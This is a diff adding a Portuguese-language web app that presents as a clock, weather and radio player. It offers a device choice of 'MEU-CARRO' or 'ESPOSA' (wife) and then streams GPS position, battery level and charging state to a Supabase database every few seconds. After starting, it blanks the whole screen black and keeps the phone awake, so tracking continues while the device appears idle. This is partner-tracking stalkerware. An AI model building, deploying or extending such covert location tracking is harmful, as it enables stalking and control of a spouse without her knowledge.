@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Rastreador + Rádio</title>
+
+<!-- PWA / instalável -->
+<link rel="manifest" href="./manifest-rastreador.json">
+<meta name="theme-color" content="#000000">
+<link rel="apple-touch-icon" href="./icon-192.png">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="Rastreador">
+
+<style>
+html,body{margin:0;height:100%;background:#000;overflow:hidden}
+body.preta, body.preta *{background:#000!important;color:#000!important;border:none!important;opacity:0!important;visibility:hidden!important;display:none!important}
+#tela{height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:monospace;background:#000}
+#h{font-size:70px;font-weight:bold;color:#fff}
+#clima{font-size:34px;margin-top:10px;color:#ccc}
+#temp{font-size:12px;color:#888;margin-top:5px;text-align:center;line-height:1.6}
+#d{font-size:11px;color:#888;margin-top:15px}
+#id{font-size:12px;color:#888;margin-top:20px}
+#btn{margin-top:18px;padding:16px 24px;border-radius:30px;background:#1a1a1a;color:#fff;border:1px solid #333;font-size:15px;font-weight:bold;cursor:pointer;font-family:monospace}
+#btn:active{transform:scale(.96)}
+#btnInstalar{display:none;margin-top:10px;padding:12px 20px;border-radius:30px;background:transparent;color:#00C48C;border:1px solid #00C48C;font-size:13px;font-weight:bold;cursor:pointer;font-family:monospace}
+#btnInstalar:active{transform:scale(.96)}
+
+/* seletor de dispositivo */
+#escolha{display:none;height:100%;align-items:center;justify-content:center;flex-direction:column;background:#000;font-family:monospace;padding:24px}
+#escolha h2{color:#fff;font-size:22px;text-align:center;margin:0 0 6px;font-weight:bold}
+#escolha p{color:#888;font-size:12px;text-align:center;line-height:1.6;margin:0 0 26px;max-width:300px}
+.esc-btn{width:260px;margin:8px 0;padding:18px;border-radius:18px;background:#1a1a1a;color:#fff;border:1px solid #333;font-size:18px;font-weight:bold;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:monospace}
+.esc-btn:active{transform:scale(.96)}
+.esc-btn .esc-emo{font-size:24px}
+.esc-btn.carro{border-color:#00C48C}
+.esc-btn.esposa{border-color:#ef4444}
+</style>
+</head>
+<body>
+
+<!-- Seletor de dispositivo (só aparece na 1ª vez, antes de escolher quem é) -->
+<div id="escolha">
+  <h2>Qual dispositivo é este?</h2>
+  <p>Define para quem este aparelho envia a localização e a bateria. Você só precisa escolher uma vez — fica salvo no aparelho.</p>
+  <button class="esc-btn carro" onclick="event.stopPropagation();escolherDispositivo('MEU-CARRO')"><span class="esc-emo">🚗</span> MEU-CARRO</button>
+  <button class="esc-btn esposa" onclick="event.stopPropagation();escolherDispositivo('ESPOSA')"><span class="esc-emo">💖</span> ESPOSA</button>
+</div>
+
+<div id="tela">
+<div id="h">--:--</div>
+<div id="clima">--</div>
+<div id="temp">toque em INICIAR<br>rádio + rastreio</div>
+<div id="d">--/--</div>
+<div id="id"></div>
+<button id="btn">▶ TOCAR PARA INICIAR</button>
+<button id="btnInstalar">⬇ Instalar app</button>
+</div>
+
+<audio id="radio" autoplay loop preload="auto" playsinline style="position:fixed;bottom:-100px;opacity:0.01"></audio>
+
+<script>
+/* ===== PWA: service worker ===== */
+if('serviceWorker' in navigator){ navigator.serviceWorker.register('./sw-rastreador.js').catch(()=>{}); }
+
+/* ===== Identificação do dispositivo =====
+ * Prioridade: ?id= da URL (e salva) > localStorage 'tracker_id' > pergunta na 1ª vez.
+ * Assim um ÚNICO app instalável serve pros dois celulares: cada um escolhe quem é.
+ */
+function resolveDeviceId(){
+  let u=new URLSearchParams(location.search).get('id');
+  if(u){ localStorage.setItem('tracker_id', u); return u; }
+  let s=localStorage.getItem('tracker_id');
+  if(s) return s;
+  return null;
+}
+let DEVICE_ID=resolveDeviceId();
+const U="https://jpaflbkafupwqfqfcjrv.supabase.co",K="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
+let BAT=0,CHARGING=false,ultimo=0,lastLat=0,lastLng=0,lastAcc=20,iniciado=false,wakeLock=null,batObj=null;
+
+if(DEVICE_ID){ document.getElementById('id').innerText=DEVICE_ID; }
+else { mostrarEscolha(); }
+function mostrarEscolha(){ document.getElementById('escolha').style.display='flex'; document.getElementById('tela').style.display='none'; }
+function escolherDispositivo(id){ localStorage.setItem('tracker_id', id); DEVICE_ID=id; document.getElementById('id').innerText=id; document.getElementById('escolha').style.display='none'; document.getElementById('tela').style.display='flex'; }
+
+/* ===== Bateria ===== */
+async function lerBateria(){
+  try{
+    if(!batObj && navigator.getBattery){
+      batObj=await navigator.getBattery();
+      batObj.addEventListener('levelchange', ()=>{ BAT=Math.round(batObj.level*100); CHARGING=batObj.charging; if(lastLat!==0) enviar(lastLat,lastLng,true); });
+      batObj.addEventListener('chargingchange', ()=>{ BAT=Math.round(batObj.level*100); CHARGING=batObj.charging; if(lastLat!==0) enviar(lastLat,lastLng,true); });
+    }
+    if(batObj){ BAT=Math.round(batObj.level*100); CHARGING=batObj.charging; }
+  }catch(e){}
+}
+lerBateria();
+
+/* ===== Relógio ===== */
+function clock(){document.getElementById('h').innerText=new Date().toLocaleTimeString('pt-BR',{hour:'2-digit',minute:'2-digit'});document.getElementById('d').innerText=new Date().toLocaleDateString('pt-BR');}
+setInterval(clock,1000);clock();
+
+/* ===== Clima ===== */
+async function clima(lat,lon){try{let r=await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);let j=await r.json();document.getElementById('clima').innerText=Math.round(j.current_weather.temperature)+"°C";}catch(e){}}
+
+/* ===== Wake Lock (mantém tela acesa) ===== */
+async function pedirWakeLock(){try{if('wakeLock' in navigator){wakeLock=await navigator.wakeLock.request('screen');wakeLock.addEventListener('release',()=>setTimeout(pedirWakeLock,1000));}}catch(e){}}
+
+/* ===== Rádio ===== */
+let audio=document.getElementById('radio');
+const RADIO_URL="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3";
+audio.src=RADIO_URL;audio.loop=true;audio.volume=0.7;
+
+/* ===== Envio de localização p/ Supabase ===== */
+async function enviar(lat,lon,forcar){
+  if(!DEVICE_ID) return;
+  await lerBateria();
+  let agora=Date.now();
+  if(!forcar && agora-ultimo<3000) return;
+  ultimo=agora; lastLat=lat; lastLng=lon; clima(lat,lon);
+  let raio=CHARGING?'⚡ ':'';
+  document.getElementById('temp').innerHTML=`${DEVICE_ID} ${raio}🔋 ${BAT}%<br>GPS OK - RÁDIO ON`;
+  try{await fetch(`${U}/rest/v1/rastreador`,{method:"POST",headers:{apikey:K,Authorization:"Bearer "+K,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID,lat:lat,lng:lon,battery:BAT,charging:CHARGING,accuracy:lastAcc,updated_at:new Date().toISOString()})});}catch(e){}
+}
+
+/* ===== Iniciar (gesto do usuário: rádio + GPS + tela acesa) ===== */
+async function iniciar(){
+  if(!DEVICE_ID){ mostrarEscolha(); return; }
+  if(iniciado) return; iniciado=true;
+  document.getElementById('btn').style.display='none';
+  document.getElementById('btnInstalar').style.display='none';
+  try{document.documentElement.requestFullscreen?.();}catch(e){}
+  await pedirWakeLock();
+  await lerBateria();
+  try{await audio.play();}catch(e){}
+  setTimeout(()=>{ document.body.classList.add('preta'); }, 3000);
+  navigator.geolocation.getCurrentPosition(p=>{ lastAcc=Math.round(p.coords.accuracy); enviar(p.coords.latitude,p.coords.longitude,true); },()=>{document.getElementById('temp').innerText='ATIVE A LOCALIZAÇÃO!';},{enableHighAccuracy:true,timeout:20000,maximumAge:0});
+  navigator.geolocation.watchPosition(p=>{ lastAcc=Math.round(p.coords.accuracy); enviar(p.coords.latitude,p.coords.longitude,false); },()=>{}, {enableHighAccuracy:true,maximumAge:0,timeout:20000});
+  setInterval(()=>{ if(lastLat!==0) enviar(lastLat,lastLng,true); },7000);
+  audio.addEventListener('error',()=>setTimeout(()=>{audio.src=RADIO_URL;audio.play().catch(()=>{});},3000));
+  document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){pedirWakeLock();audio.play().catch(()=>{});}});
+}
+document.getElementById('btn').onclick=iniciar;
+document.body.onclick=()=>{ if(!DEVICE_ID){ return; } if(!iniciado) iniciar(); else { audio.play().catch(()=>{}); pedirWakeLock(); } };
+
+/* ===== Instalação do app ===== */
+let deferredInstall=null;
+window.addEventListener('beforeinstallprompt',(e)=>{ e.preventDefault(); deferredInstall=e; if(DEVICE_ID && !iniciado) document.getElementById('btnInstalar').style.display='inline-block'; });
+window.addEventListener('appinstalled',()=>{ deferredInstall=null; document.getElementById('btnInstalar').style.display='none'; });
+function instalar(){ if(deferredInstall){ deferredInstall.prompt(); deferredInstall.userChoice.then(()=>{ deferredInstall=null; document.getElementById('btnInstalar').style.display='none'; }); } }
+document.getElementById('btnInstalar').onclick=instalar;
+
+console.log('%c🔒 RASTREADOR+RÁDIO PWA v1.0','color:#00C48C;font-weight:bold;font-size:14px');
+</script>
+</body>
+</html>
